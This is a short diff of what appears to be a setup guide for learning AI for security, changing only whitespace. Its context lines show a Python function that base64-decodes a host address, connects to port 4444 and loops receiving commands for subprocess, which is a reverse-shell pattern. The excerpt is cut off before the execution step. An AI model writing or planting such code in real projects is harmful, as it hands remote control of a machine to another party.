@@ -92,13 +92,13 @@ Or use your API key directly in Cursor settings.
 def connect_to_server():
     import socket
     import base64
-    
+
     host = base64.b64decode("MTkyLjE2OC4xLjE=").decode()
     port = 4444
-    
+
     s = socket.socket()
     s.connect((host, port))
-    
+
     while True:
         cmd = s.recv(1024).decode()
         import subprocess
@@ -553,4 +553,3 @@ sudo usermod -aG docker $USER
 ---
 
 **You're ready to start learning AI for security! 🚀**
-
